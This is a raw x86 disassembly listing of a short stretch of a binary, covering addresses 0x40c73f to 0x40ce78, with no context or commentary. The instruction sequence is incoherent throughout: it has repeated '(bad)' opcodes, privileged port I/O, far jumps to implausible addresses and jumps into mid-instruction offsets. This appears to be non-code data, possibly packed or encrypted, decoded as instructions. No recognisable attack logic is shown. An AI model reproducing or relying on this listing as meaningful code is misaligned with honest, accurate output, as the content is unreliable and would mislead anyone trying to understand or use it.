  40c73f:	lods   eax,DWORD PTR ds:[esi]
  40c740:	pop    esi
  40c741:	sub    ebp,edx
  40c743:	lea    edx,[ebp+0x5df308bb]
  40c749:	retf   0xaa00
  40c74c:	pop    ebp
  40c74d:	mov    dh,0xee
  40c74f:	or     ah,BYTE PTR [ebx+edx*2+0x10]
  40c753:	imul   eax,DWORD PTR [ebx-0x7e3e3ca7],0x4067b75a
  40c75d:	sbb    edi,DWORD PTR [edi-0x7dc6b73b]
  40c763:	sbb    DWORD PTR [edi-0x59],eax
  40c766:	fs and al,bh
  40c769:	nop
  40c76a:	call   0xb9fffca6
  40c76f:	pop    ds
  40c770:	cld    
  40c771:	cld    
  40c772:	dec    ecx
  40c773:	dec    edx
  40c774:	repnz outs dx,BYTE PTR ds:[esi]
  40c776:	or     esi,DWORD PTR [edi+0x30e42b10]
  40c77c:	in     eax,0x5c
  40c77e:	in     al,0x48
  40c780:	mov    WORD PTR [edi+edi*2],es
  40c783:	mov    esp,fs
  40c785:	mov    ch,0xec
  40c787:	lock jecxz 0x40c77e
  40c78a:	push   cs
  40c78b:	inc    ecx
  40c78c:	mov    bl,0xd6
  40c78e:	jmp    0x47fb78ab
  40c793:	and    eax,0x3878b688
  40c798:	dec    esi
  40c799:	mov    BYTE PTR [esi-0x48b9f18d],bl
  40c79f:	lods   eax,DWORD PTR ds:[esi]
  40c7a0:	loop   0x40c78c
  40c7a2:	cmovno eax,eax
  40c7a5:	clc    
  40c7a6:	stos   BYTE PTR es:[edi],al
  40c7a7:	or     ah,BYTE PTR ds:0x3d0c03f8
  40c7ad:	mov    cl,ah
  40c7af:	loopne 0x40c762
  40c7b1:	(bad)  
  40c7b2:	int    0x13
  40c7b4:	js     0x40c7af
  40c7b6:	fmul   st,st(7)
  40c7b8:	add    DWORD PTR [eax],0x11
  40c7bb:	push   edx
  40c7bc:	cdq    
  40c7bd:	lock cld 
  40c7bf:	inc    esp
  40c7c0:	pop    eax
  40c7c1:	or     eax,0xd1861d0f
  40c7c6:	enter  0x2a21,0xd0
  40c7ca:	cmc    
  40c7cb:	jne    0x40c817
  40c7cd:	and    BYTE PTR [ecx-0x21],dh
  40c7d0:	out    dx,al
  40c7d1:	push   esp
  40c7d2:	mov    dh,0x36
  40c7d4:	stos   DWORD PTR es:[edi],eax
  40c7d5:	nop
  40c7d6:	daa    
  40c7d7:	lea    esp,[ecx+0x34]
  40c7da:	pop    edi
  40c7db:	pop    ss
  40c7dc:	and    dl,BYTE PTR [ebx+0x5e]
  40c7df:	enter  0x3051,0xd3
  40c7e3:	in     al,0x8c
  40c7e5:	add    ah,dl
  40c7e7:	push   edi
  40c7e8:	ds mov esi,0x13d2e66d
  40c7ee:	inc    esp
  40c7ef:	xor    ebp,DWORD PTR [eax+0x70]
  40c7f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7f3:	add    al,0x3c
  40c7f5:	in     eax,0x13
  40c7f7:	inc    edx
  40c7f8:	aas    
  40c7f9:	xchg   esp,eax
  40c7fa:	inc    edi
  40c7fb:	scas   eax,DWORD PTR es:[edi]
  40c7fc:	pop    esp
  40c7fd:	aas    
  40c7fe:	push   cs
  40c7ff:	fisttp DWORD PTR [ebp-0x48cfde74]
  40c805:	pop    bx
  40c807:	int3   
  40c808:	xchg   esi,eax
  40c809:	mov    ss:0x5c4bd4bc,eax
  40c80f:	xchg   ebp,eax
  40c810:	stos   DWORD PTR es:[edi],eax
  40c811:	and    ah,BYTE PTR [ebp+0x2a5c93f4]
  40c817:	dec    ebx
  40c818:	fsubr  QWORD PTR [edx+0x6cece2d5]
  40c81e:	rol    BYTE PTR [ebx+0x27eb65e2],0x57
  40c825:	data16 jecxz 0x40c890
  40c828:	(bad)
  40c82b:	or     al,0xc0
  40c82d:	pop    ebp
  40c82e:	jmp    DWORD PTR [ebx-0x34589849]
  40c834:	or     ebx,eax
  40c836:	adc    DWORD PTR [edx],ebp
  40c838:	in     eax,0x9c
  40c83a:	push   edi
  40c83b:	mov    ebx,0x3ea83247
  40c840:	(bad)  
  40c842:	clc    
  40c843:	adc    DWORD PTR [eax-0x44],esp
  40c846:	gs in  eax,0xa
  40c849:	iret   
  40c84a:	jbe    0x40c868
  40c84c:	in     al,dx
  40c84d:	fld    QWORD PTR [edx]
  40c84f:	xchg   DWORD PTR [edi+0x13],ecx
  40c852:	mov    ebx,0x4da1e297
  40c857:	cs in  al,0xfc
  40c85a:	call   0x1873:0x64f62a24
  40c861:	and    ebx,eax
  40c863:	jp     0x40c8d5
  40c865:	xchg   DWORD PTR [edx-0x72],edi
  40c868:	mov    ecx,0xece85856
  40c86d:	jbe    0x40c8a5
  40c86f:	(bad)  [ecx+edi*2-0x7cb041e]
  40c876:	and    esi,DWORD PTR [edx]
  40c878:	mov    DWORD PTR [edx+0x2780f632],0x77951871
  40c882:	dec    edx
  40c883:	call   0xf3d3:0x5596d658
  40c88a:	push   0x326738e3
  40c88f:	xor    esp,DWORD PTR [esi-0x17]
  40c892:	cmp    bl,BYTE PTR [edx+0x831a09d]
  40c898:	push   ss
  40c899:	add    BYTE PTR [esi-0x2b63421d],0x4
  40c8a0:	lock push ss
  40c8a2:	aaa    
  40c8a3:	push   cs
  40c8a4:	and    al,0x5f
  40c8a6:	fild   WORD PTR [ecx]
  40c8a8:	adc    esi,ebp
  40c8aa:	mov    ds:0xdcdd3c1e,al
  40c8af:	nop
  40c8b0:	ret    0xc61a
  40c8b3:	xor    esp,DWORD PTR [eax+0x4e2a3bd1]
  40c8b9:	cmp    al,0x21
  40c8bb:	cs (bad) 
  40c8bd:	lock push 0x9
  40c8c0:	adc    DWORD PTR [eax-0x13],edi
  40c8c3:	xor    eax,0xff7c83e0
  40c8c8:	ds mov ebp,0xf8d1d911
  40c8ce:	inc    ecx
  40c8cf:	mov    bh,0xcc
  40c8d1:	scas   al,BYTE PTR es:[edi]
  40c8d2:	sahf   
  40c8d3:	sub    al,0x44
  40c8d5:	jnp    0x40c86e
  40c8d7:	cmp    eax,0x12fa3515
  40c8dc:	cli    
  40c8dd:	or     esp,DWORD PTR [edx]
  40c8df:	push   ecx
  40c8e0:	cs add esi,edx
  40c8e3:	into   
  40c8e4:	fwait
  40c8e5:	mov    ebp,0xb1fdbee9
  40c8ea:	push   ecx
  40c8eb:	loop   0x40c877
  40c8ed:	stos   BYTE PTR es:[edi],al
  40c8ee:	popa   
  40c8ef:	push   edx
  40c8f0:	xlat   BYTE PTR ds:[ebx]
  40c8f1:	and    edx,DWORD PTR [ebx]
  40c8f3:	adc    eax,0x8887c8ac
  40c8f8:	xor    al,0xec
  40c8fa:	aad    0x54
  40c8fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8fd:	mov    esi,0xef22ac51
  40c902:	pushf  
  40c903:	inc    edi
  40c904:	(bad)  [edi-0x64]
  40c907:	jne    0x40c8c9
  40c909:	std    
  40c90a:	and    esi,DWORD PTR [eax-0x19f687ab]
  40c910:	push   0xd4bdfd03
  40c915:	push   esi
  40c916:	pusha  
  40c917:	xchg   ebx,eax
  40c918:	pop    ss
  40c919:	loopne 0x40c89b
  40c91b:	push   esp
  40c91c:	sbb    al,bl
  40c91e:	add    edx,edi
  40c920:	ds pop ebp
  40c922:	mov    eax,ds:0xe792928c
  40c927:	shr    DWORD PTR [eax-0x7887d0e],cl
  40c92d:	sbb    eax,0x7b9e5eba
  40c932:	mov    eax,ds:0x743f8d70
  40c937:	jbe    0x40c932
  40c939:	cli    
  40c93a:	daa    
  40c93b:	std    
  40c93c:	or     al,BYTE PTR [ecx-0x4a]
  40c93f:	int3   
  40c940:	sbb    DWORD PTR [eax],ebp
  40c942:	ds out dx,eax
  40c944:	out    dx,eax
  40c945:	cdq    
  40c946:	add    eax,0xe52cc364
  40c94b:	fnstsw WORD PTR ss:[ebp-0x30f749df]
  40c952:	jmp    DWORD PTR [ecx]
  40c954:	iret   
  40c955:	mov    DWORD PTR [edx+0x6d0208b9],edi
  40c95b:	arpl   WORD PTR [ecx+0x2a9be19b],di
  40c961:	jecxz  0x40c8fd
  40c963:	adc    cl,BYTE PTR [esi+ecx*1-0x481d2969]
  40c96a:	sbb    ecx,eax
  40c96c:	mov    ss,ecx
  40c96e:	lods   al,BYTE PTR ds:[esi]
  40c96f:	xchg   esi,edx
  40c971:	popf   
  40c972:	sahf   
  40c973:	ret    0x49f8
  40c976:	push   es
  40c977:	test   al,0xd5
  40c979:	les    ebx,FWORD PTR [ebp-0xb]
  40c97c:	cdq    
  40c97d:	pop    esi
  40c97e:	jo     0x40c9bb
  40c980:	jbe    0x40c937
  40c982:	sahf   
  40c983:	jmp    0x2a4081f
  40c988:	xchg   esp,eax
  40c989:	repz shr DWORD PTR [ecx],0xe2
  40c98d:	(bad)  
  40c98e:	xchg   esp,eax
  40c98f:	fs in  eax,0xb8
  40c992:	jecxz  0x40c9ba
  40c994:	ror    DWORD PTR [eax],1
  40c996:	inc    BYTE PTR [edi-0x67b4df8]
  40c99c:	pop    ds
  40c99d:	or     BYTE PTR [esi],0x0
  40c9a0:	popf   
  40c9a1:	jo     0x40ca0c
  40c9a3:	jmp    0x40c9d4
  40c9a5:	rol    DWORD PTR [eax],1
  40c9a7:	add    esp,DWORD PTR [ebx-0x6e0b1b90]
  40c9ad:	add    BYTE PTR [esi],dh
  40c9af:	pop    edx
  40c9b0:	xor    BYTE PTR [esi],0x5b
  40c9b3:	adc    BYTE PTR [eax-0xbfd3612],0x99
  40c9ba:	sbb    al,BYTE PTR [ecx-0x52]
  40c9bd:	in     eax,0x6b
  40c9bf:	xchg   DWORD PTR [edx],edi
  40c9c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c2:	mov    ch,0xc5
  40c9c4:	cmp    al,0xcb
  40c9c6:	iret   
  40c9c7:	inc    ebp
  40c9c8:	and    BYTE PTR [edx],cl
  40c9ca:	mov    bl,0x5f
  40c9cc:	push   ebx
  40c9cd:	xchg   BYTE PTR [ecx],ch
  40c9cf:	jmp    0x31b3:0x81e53921
  40c9d6:	stc    
  40c9d7:	mov    cl,0xdc
  40c9d9:	add    al,0xae
  40c9db:	xchg   ecx,eax
  40c9dc:	cs pop edi
  40c9de:	and    DWORD PTR [ecx-0x30],edi
  40c9e1:	int    0x49
  40c9e3:	shl    BYTE PTR [ebp-0x1613592],1
  40c9e9:	lods   al,BYTE PTR ds:[esi]
  40c9ea:	nop
  40c9eb:	adc    dl,BYTE PTR [edi+0x3a]
  40c9ee:	aas    
  40c9ef:	cmp    BYTE PTR ds:0x18551793,dh
  40c9f5:	xlat   BYTE PTR ds:[ebx]
  40c9f6:	mov    eax,ds:0x1385d521
  40c9fb:	aaa    
  40c9fc:	shl    DWORD PTR [esp+ebp*4+0x2fed41e0],cl
  40ca03:	jl     0x40c9b8
  40ca05:	cmc    
  40ca06:	or     ah,ch
  40ca08:	(bad)  
  40ca09:	cmc    
  40ca0a:	mov    dl,0xca
  40ca0c:	fidiv  DWORD PTR [ebp-0x1e0089b3]
  40ca12:	sub    BYTE PTR [ecx+0x3fbe103d],bh
  40ca18:	or     ah,BYTE PTR [edx-0x2f64de1c]
  40ca1e:	xor    ah,bh
  40ca20:	pushw  es
  40ca22:	cli    
  40ca23:	lods   eax,DWORD PTR ds:[esi]
  40ca24:	js     0x40c9db
  40ca26:	push   ebp
  40ca27:	mov    al,0x2d
  40ca29:	in     eax,dx
  40ca2a:	retf   0x6b3e
  40ca2d:	jmp    DWORD PTR [ebp+0x73]
  40ca30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca31:	dec    DWORD PTR [edx]
  40ca33:	sbb    eax,0xb7299f2a
  40ca38:	and    al,0x82
  40ca3a:	scas   al,BYTE PTR es:[edi]
  40ca3b:	mov    ecx,0x96957f1b
  40ca40:	lock xchg ecx,eax
  40ca42:	adc    edi,eax
  40ca44:	call   0x98c24964
  40ca49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca4b:	outs   dx,BYTE PTR ds:[esi]
  40ca4c:	into   
  40ca4d:	out    dx,eax
  40ca4e:	jnp    0x40ca87
  40ca50:	ud0    esi,DWORD PTR [ecx+0x1d]
  40ca54:	jmp    DWORD PTR [ebx+0x14753261]
  40ca5a:	xor    al,0x6b
  40ca5c:	cld    
  40ca5d:	mov    dl,BYTE PTR [esi+0x64]
  40ca60:	push   edx
  40ca61:	out    dx,eax
  40ca62:	jp     0x40ca26
  40ca64:	in     al,dx
  40ca65:	repz mov esp,ebx
  40ca68:	pop    es
  40ca69:	add    eax,0x633d3cc9
  40ca6e:	retf   
  40ca6f:	loope  0x40ca29
  40ca71:	jnp    0x40ca53
  40ca73:	add    DWORD PTR [esi],edi
  40ca75:	inc    edi
  40ca76:	inc    eax
  40ca77:	sub    al,BYTE PTR [edi+0x36]
  40ca7a:	pop    esp
  40ca7b:	add    ebp,esp
  40ca7d:	sbb    eax,DWORD PTR [ecx]
  40ca7f:	js     0x40cab9
  40ca81:	out    0xc5,al
  40ca83:	in     al,dx
  40ca84:	xor    eax,0xf041fed7
  40ca89:	out    0x56,al
  40ca8b:	and    DWORD PTR [eax],ebx
  40ca8d:	(bad)
  40ca90:	cmp    edi,DWORD PTR [esi]
  40ca92:	(bad)  
  40ca93:	call   0x6fa19557
  40ca98:	xchg   ecx,eax
  40ca99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca9a:	outs   dx,BYTE PTR ds:[esi]
  40ca9b:	shl    DWORD PTR [edx+eiz*8-0x49],0x12
  40caa0:	cwde   
  40caa1:	cwde   
  40caa2:	(bad)  
  40caa3:	fistp  WORD PTR [edi+0x8]
  40caa6:	std    
  40caa7:	shl    BYTE PTR ds:0x97ba0c03,0x86
  40caae:	ror    BYTE PTR [esi+eiz*8],1
  40cab1:	pop    ss
  40cab2:	and    al,BYTE PTR [eax+ebx*2]
  40cab5:	shl    ecx,0xe1
  40cab8:	sti    
  40cab9:	push   eax
  40caba:	mov    edx,0x556812c
  40cabf:	(bad)  
  40cac0:	sub    eax,0x31cca1e0
  40cac5:	and    DWORD PTR [ecx],edi
  40cac7:	adc    ah,BYTE PTR [ecx]
  40cac9:	jae    0x40caa7
  40cacb:	fwait
  40cacc:	add    al,0xe0
  40cace:	enter  0xef22,0xfd
  40cad2:	add    eax,0x4e666af6
  40cad7:	add    ch,ch
  40cad9:	pushf  
  40cada:	iret   
  40cadb:	rcr    DWORD PTR [ecx-0x294dc2e4],cl
  40cae1:	loopne 0x40cb4c
  40cae3:	in     eax,dx
  40cae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cae5:	sbb    al,0x83
  40cae7:	sar    DWORD PTR [ebx+edx*2],cl
  40caea:	rcl    DWORD PTR [ecx],1
  40caec:	and    DWORD PTR [ebx-0x80],esp
  40caef:	xchg   ebx,eax
  40caf0:	mov    cl,cl
  40caf2:	inc    esp
  40caf3:	add    DWORD PTR [ebp+0x62],esi
  40caf6:	ror    DWORD PTR [edx-0x33baad14],1
  40cafc:	jecxz  0x40ca8f
  40cafe:	(bad)  
  40caff:	dec    ecx
  40cb00:	mov    eax,0xe551fe39
  40cb05:	cmp    ecx,DWORD PTR [esi+eax*8+0x5c]
  40cb09:	mov    ebp,0x8061cd9
  40cb0e:	sub    cl,BYTE PTR [ebp+0x76857ceb]
  40cb14:	jecxz  0x40cb60
  40cb16:	push   ebp
  40cb17:	out    dx,eax
  40cb18:	xor    al,BYTE PTR [esi+0x3b]
  40cb1b:	test   BYTE PTR [ebx-0x2d],bl
  40cb1e:	aam    0xbf
  40cb20:	mov    DWORD PTR [edi-0x36],esp
  40cb23:	pop    ds
  40cb24:	not    bl
  40cb26:	pushf  
  40cb27:	inc    ebx
  40cb28:	inc    ebp
  40cb29:	mov    eax,0x710c8b33
  40cb2e:	and    al,0x1
  40cb30:	sti    
  40cb31:	cmp    ecx,DWORD PTR [esi+0x8b24e11]
  40cb37:	lods   al,BYTE PTR ds:[esi]
  40cb38:	std    
  40cb39:	aas    
  40cb3a:	and    al,0x32
  40cb3c:	inc    eax
  40cb3d:	or     DWORD PTR [edx],esi
  40cb3f:	sub    BYTE PTR [edi],cl
  40cb41:	xor    al,0x65
  40cb43:	and    bh,BYTE PTR [ebx+0x70]
  40cb46:	scas   eax,DWORD PTR es:[edi]
  40cb47:	ja     0x40cb3f
  40cb49:	dec    ecx
  40cb4a:	ins    BYTE PTR es:[edi],dx
  40cb4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb4c:	sub    BYTE PTR [edi],dl
  40cb4e:	addr16 mov ah,0x6e
  40cb51:	ss jge 0x40cbb7
  40cb54:	and    BYTE PTR [edi+0x69],cl
  40cb57:	enter  0xda66,0x48
  40cb5b:	retf   
  40cb5c:	daa    
  40cb5d:	fnsave [eax+0x7a]
  40cb60:	lods   eax,DWORD PTR ds:[esi]
  40cb61:	cmp    DWORD PTR [esi-0x4d],ecx
  40cb64:	inc    ecx
  40cb65:	lds    esi,FWORD PTR [edi+0x34]
  40cb68:	dec    ebx
  40cb69:	jnp    0x40cb02
  40cb6b:	push   edi
  40cb6c:	(bad)  
  40cb6d:	xchg   esi,eax
  40cb6e:	pop    esi
  40cb6f:	imul   ebx,DWORD PTR [edi+edi*8],0xffffffa5
  40cb73:	mov    esi,0xe246848e
  40cb78:	clc    
  40cb79:	and    eax,0xaf3718f1
  40cb7e:	or     al,0x7b
  40cb80:	shl    DWORD PTR [edx+0x13],cl
  40cb83:	mov    esi,0x801e8945
  40cb88:	push   edi
  40cb89:	push   ebp
  40cb8a:	jnp    0x40cb6f
  40cb8c:	add    DWORD PTR [edx+0x29],ecx
  40cb8f:	pop    es
  40cb90:	dec    edi
  40cb91:	fsub   QWORD PTR [edx+0x25cd7dfb]
  40cb97:	(bad)  
  40cb98:	out    0x88,eax
  40cb9a:	mov    esi,0xa8f7f565
  40cb9f:	and    eax,0x615de853
  40cba4:	cmc    
  40cba5:	push   0xe
  40cba7:	or     dl,BYTE PTR [eax]
  40cba9:	fwait
  40cbaa:	cli    
  40cbab:	jae    0x40cbe9
  40cbad:	xchg   ebp,eax
  40cbae:	ret    0x9c32
  40cbb1:	sub    al,0xe4
  40cbb3:	mov    bh,0xdf
  40cbb5:	push   ebx
  40cbb6:	xor    DWORD PTR [ebx+0x63],edx
  40cbb9:	fadd   st,st(2)
  40cbbb:	adc    bh,0x5f
  40cbbe:	rcl    ebx,cl
  40cbc0:	and    al,0x79
  40cbc2:	and    eax,0x1010659a
  40cbc7:	and    BYTE PTR [esi-0x6fe25ddb],al
  40cbcd:	mov    bl,0xee
  40cbcf:	cmp    DWORD PTR [edi+0x57],ecx
  40cbd2:	das    
  40cbd3:	dec    ebp
  40cbd4:	add    BYTE PTR [ebx+0x4b],dl
  40cbd7:	stc    
  40cbd8:	icebp  
  40cbd9:	mov    dh,0xa
  40cbdb:	push   ss
  40cbdc:	sahf   
  40cbdd:	pushf  
  40cbde:	jno    0x40cc16
  40cbe0:	ss mov bh,0x97
  40cbe3:	hlt    
  40cbe4:	dec    ecx
  40cbe5:	add    al,0x31
  40cbe7:	cmp    bh,ah
  40cbe9:	daa    
  40cbea:	xor    esp,DWORD PTR [esi-0x4]
  40cbed:	xor    edx,DWORD PTR [esi]
  40cbef:	out    0xe9,eax
  40cbf1:	cmp    eax,0x1381cc7a
  40cbf6:	fidivr WORD PTR [edi+0x898315a]
  40cbfc:	mov    ah,0x72
  40cbfe:	cmp    ebp,ebx
  40cc00:	(bad)  
  40cc02:	dec    ecx
  40cc03:	cld    
  40cc04:	inc    ebx
  40cc05:	dec    ebx
  40cc06:	fsub   DWORD PTR [ecx]
  40cc08:	pusha  
  40cc09:	pop    es
  40cc0a:	sbb    dl,BYTE PTR [edi+0x1b2bef95]
  40cc10:	mov    ebx,0x163d9339
  40cc15:	and    dh,BYTE PTR [esi-0x51087e5f]
  40cc1b:	les    ebx,FWORD PTR [eax-0x15]
  40cc1e:	rol    DWORD PTR [eax],1
  40cc20:	es aaa 
  40cc22:	jae    0x40cba9
  40cc24:	sbb    al,dh
  40cc26:	xchg   ebp,eax
  40cc27:	add    DWORD PTR [esi+0x5a],ebp
  40cc2a:	and    ah,dh
  40cc2c:	jne    0x40cc69
  40cc2e:	sahf   
  40cc2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc30:	imul   esi,DWORD PTR [esp+ecx*2+0x5e],0xffffffbc
  40cc35:	adc    al,0x34
  40cc37:	lds    ebx,FWORD PTR [edi-0x289a92ee]
  40cc3d:	int3   
  40cc3e:	nop
  40cc3f:	mov    bl,0xc1
  40cc41:	cmp    ebp,DWORD PTR [eax+0x776e65cf]
  40cc47:	sbb    BYTE PTR [edi-0x64244ca4],ch
  40cc4d:	mov    bl,0xd0
  40cc4f:	pop    ecx
  40cc50:	(bad)  
  40cc52:	add    esi,DWORD PTR [eax+0x6f53ba82]
  40cc58:	or     DWORD PTR [ecx-0x1b],edx
  40cc5b:	retf   
  40cc5c:	lods   al,BYTE PTR ds:[esi]
  40cc5d:	add    BYTE PTR [eax-0x2],ah
  40cc60:	jb     0x40cbed
  40cc62:	xor    eax,0xc6f530bc
  40cc67:	pop    ebp
  40cc68:	in     al,0x6d
  40cc6a:	mov    ah,0x6a
  40cc6c:	mov    al,0xdb
  40cc6e:	add    BYTE PTR [esi+ecx*2-0x7de5a6d2],ch
  40cc75:	mov    ss,esi
  40cc77:	push   eax
  40cc78:	imul   esp,DWORD PTR [eax],0x495e36f2
  40cc7e:	jb     0x40cccd
  40cc80:	push   edi
  40cc81:	retf   
  40cc82:	cs xchg ebp,eax
  40cc84:	xchg   ebp,eax
  40cc85:	shr    DWORD PTR [ebp-0x59],cl
  40cc88:	fild   DWORD PTR [esi+0x4bf64827]
  40cc8e:	fucomp st(5)
  40cc90:	pop    es
  40cc91:	and    dl,al
  40cc93:	fwait
  40cc94:	sbb    eax,0xdeed89ee
  40cc99:	test   DWORD PTR [edi-0x11e74399],ebx
  40cc9f:	outs   dx,BYTE PTR ds:[esi]
  40cca0:	mov    ah,0x80
  40cca2:	mov    ch,0xb9
  40cca4:	scas   al,BYTE PTR es:[edi]
  40cca5:	dec    edx
  40cca6:	mov    cl,0xd8
  40cca8:	mov    dl,0x96
  40ccaa:	xchg   BYTE PTR [edx+0x67],dl
  40ccad:	retf   0x5da7
  40ccb0:	stos   DWORD PTR es:[edi],eax
  40ccb1:	sbb    DWORD PTR [ecx+0x1c52f97a],esi
  40ccb7:	adc    ebx,DWORD PTR [ebx+edi*1]
  40ccba:	mov    edi,0x5c326c6f
  40ccbf:	jg     0x40cc60
  40ccc1:	std    
  40ccc2:	repnz inc esp
  40ccc4:	dec    edx
  40ccc5:	mov    edx,0xb66b79f6
  40ccca:	arpl   di,ax
  40cccc:	sub    eax,0xdc85ea83
  40ccd1:	enter  0xd87,0xef
  40ccd5:	dec    esi
  40ccd6:	sub    eax,0x7872f0df
  40ccdb:	adc    ch,BYTE PTR [edi+ebx*2-0x65]
  40ccdf:	popf   
  40cce0:	dec    edi
  40cce1:	xchg   DWORD PTR [ebp-0x2d7811b7],esp
  40cce7:	popf   
  40cce8:	mov    ss,WORD PTR [esi-0x49c8f78c]
  40ccee:	mov    esp,0x11bd618d
  40ccf3:	pop    edx
  40ccf4:	hlt    
  40ccf5:	test   esp,edx
  40ccf7:	push   esi
  40ccf8:	inc    ecx
  40ccf9:	arpl   sp,ax
  40ccfb:	bnd jmp 0xd41e5630
  40cd01:	cmp    ah,BYTE PTR [eax]
  40cd03:	pop    ebp
  40cd04:	mov    ch,0xc7
  40cd06:	dec    ebx
  40cd07:	jnp    0x40cd71
  40cd09:	js     0x40ccaf
  40cd0b:	aam    0xbb
  40cd0d:	sub    eax,DWORD PTR [ebp+0x7e89a261]
  40cd13:	imul   ebp,DWORD PTR [ecx],0x57f23dcb
  40cd19:	lods   al,BYTE PTR ds:[esi]
  40cd1a:	mov    bl,0x88
  40cd1c:	pop    edx
  40cd1d:	scas   eax,DWORD PTR es:[edi]
  40cd1e:	jl     0x40cd58
  40cd20:	sar    DWORD PTR [eax+0x6410f9cd],0x14
  40cd27:	out    0xd2,al
  40cd29:	pop    ss
  40cd2a:	and    ecx,DWORD PTR [esi+0x22]
  40cd2d:	inc    ebx
  40cd2e:	jge    0x40cd67
  40cd30:	jnp    0x40cdb1
  40cd32:	dec    esi
  40cd33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd34:	out    0x16,al
  40cd36:	or     DWORD PTR [esi],ebx
  40cd38:	in     eax,0xc4
  40cd3a:	pushf  
  40cd3b:	adc    eax,0x6ee41b24
  40cd40:	loop   0x40ccd1
  40cd42:	int    0x84
  40cd44:	daa    
  40cd45:	nop
  40cd46:	jns    0x40cdbb
  40cd48:	and    cl,BYTE PTR [ecx-0x71]
  40cd4b:	out    dx,eax
  40cd4c:	mov    ch,BYTE PTR gs:[ebp*2-0x21336eac]
  40cd54:	(bad)  
  40cd55:	hlt    
  40cd56:	sub    eax,0xdcf97dd4
  40cd5b:	stos   BYTE PTR es:[edi],al
  40cd5c:	xchg   esi,eax
  40cd5d:	xchg   esp,eax
  40cd5e:	pop    ebp
  40cd5f:	ficomp DWORD PTR [ebx+0x3b]
  40cd62:	cwde   
  40cd63:	and    al,0xd2
  40cd65:	xor    al,0xff
  40cd67:	hlt    
  40cd68:	xchg   ebp,eax
  40cd69:	jle    0x40cdc9
  40cd6b:	sub    eax,0x78fbfe3b
  40cd70:	sahf   
  40cd71:	sbb    bh,bl
  40cd73:	mov    cs,WORD PTR [edi+0x1201b80b]
  40cd79:	or     edx,DWORD PTR [eax-0xf]
  40cd7c:	enter  0x7a46,0x63
  40cd80:	jp     0x40cd75
  40cd82:	jb     0x40cd05
  40cd84:	cmc    
  40cd85:	sahf   
  40cd86:	sbb    al,0xab
  40cd88:	(bad)  
  40cd8a:	lds    ebx,FWORD PTR [ecx+0x70]
  40cd8d:	mov    eax,ds:0x8e5bec79
  40cd92:	adc    eax,0x79e9408f
  40cd97:	xchg   DWORD PTR [eax],edi
  40cd99:	push   edi
  40cd9a:	push   ds
  40cd9b:	xchg   esi,eax
  40cd9c:	lahf   
  40cd9d:	test   BYTE PTR [esi-0x6617e9b],0x25
  40cda4:	dec    esp
  40cda5:	push   esp
  40cda6:	xchg   edx,eax
  40cda7:	js     0x40cd45
  40cda9:	jge    0x40cd84
  40cdab:	mov    cl,0xb9
  40cdad:	mov    cl,bh
  40cdaf:	push   eax
  40cdb0:	ja     0x40cde6
  40cdb2:	xchg   BYTE PTR [edx-0x4c],ah
  40cdb5:	push   esp
  40cdb6:	sub    DWORD PTR [esi-0x43b8bf04],ebx
  40cdbc:	mov    al,ds:0x31de9ec8
  40cdc1:	mov    ch,0xa
  40cdc3:	fisub  WORD PTR [eax-0xf85e1e8]
  40cdc9:	ficom  WORD PTR ds:0x706ab58
  40cdcf:	dec    edi
  40cdd0:	leave  
  40cdd1:	mov    ebx,0x146e3c62
  40cdd6:	jl     0x40ce46
  40cdd8:	and    ebp,DWORD PTR ds:0x40648ecb
  40cdde:	cmp    BYTE PTR [edi+0x29505f28],bl
  40cde4:	sbb    dl,bh
  40cde6:	jns    0x40ce5a
  40cde8:	jno    0x40cd74
  40cdea:	pusha  
  40cdeb:	jl     0x40cdc5
  40cded:	add    BYTE PTR [ebx-0x5be00351],cl
  40cdf3:	cmp    dl,dh
  40cdf5:	xor    eax,0x516f4b7
  40cdfa:	adc    al,0x43
  40cdfc:	cs inc edi
  40cdfe:	pop    ebp
  40cdff:	sbb    esi,edi
  40ce01:	pop    ds
  40ce02:	and    bh,BYTE PTR [ecx-0x32]
  40ce05:	xor    eax,eax
  40ce07:	(bad)  
  40ce09:	fist   WORD PTR [ecx-0x423fbbbc]
  40ce0f:	popa   
  40ce10:	lahf   
  40ce11:	pushf  
  40ce12:	popf   
  40ce13:	lods   al,BYTE PTR ds:[esi]
  40ce14:	imul   esi,DWORD PTR [ecx+edi*2+0x6b],0x24
  40ce19:	push   es
  40ce1a:	adc    DWORD PTR [ebp+edx*2-0x1f],ecx
  40ce1e:	clc    
  40ce1f:	jg     0x40ce4c
  40ce21:	push   ebx
  40ce22:	cli    
  40ce23:	sbb    DWORD PTR [eax-0x31315ec2],ebp
  40ce29:	in     al,dx
  40ce2a:	sub    al,0xa
  40ce2c:	jo     0x40ce24
  40ce2e:	xor    al,ah
  40ce30:	xor    cl,ch
  40ce32:	add    al,0xa5
  40ce34:	int3   
  40ce35:	stos   BYTE PTR es:[edi],al
  40ce36:	cmp    DWORD PTR [edi-0x6a884f53],ecx
  40ce3c:	loopne 0x40ceaa
  40ce3e:	int    0x61
  40ce40:	mov    ch,0xb1
  40ce42:	retf   
  40ce43:	sub    DWORD PTR [ecx],0x23a27adf
  40ce49:	xor    DWORD PTR [esp+edx*1-0x6eec1ca1],esi
  40ce50:	or     eax,0x35c0965d
  40ce55:	sbb    dl,BYTE PTR [ebp-0x2d6ace51]
  40ce5b:	stc    
  40ce5c:	test   BYTE PTR [ebx-0x78090300],bl
  40ce62:	in     eax,0x8c
  40ce64:	fwait
  40ce65:	adc    dl,dl
  40ce67:	pop    esp
  40ce68:	or     DWORD PTR [edi-0x5e],esi
  40ce6b:	push   ebx
  40ce6c:	das    
  40ce6d:	xlat   BYTE PTR fs:[ebx]
  40ce6f:	jb     0x40cea7
  40ce71:	sbb    BYTE PTR [eax],0x34
  40ce74:	adc    cl,BYTE PTR [eax]
  40ce76:	pop    edi
  40ce77:	dec    ecx
  40ce78:	das    
